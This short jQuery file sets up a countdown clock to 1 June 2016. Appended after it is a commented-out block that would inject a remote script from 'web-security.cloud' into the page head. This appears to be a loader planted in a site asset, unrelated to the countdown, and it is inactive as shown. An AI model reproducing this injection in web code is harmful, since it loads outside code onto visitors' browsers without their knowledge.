$(function() {
    // comming count down clock
    $('#clock').countDown({  
        targetDate: {
            'day'   : 1,
            'month' : 6,
            'year'  : 2016,
            'hour'  : 0,
            'min'   : 0,
            'sec'   : 0
        },
        omitWeeks: true
    });
});

/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/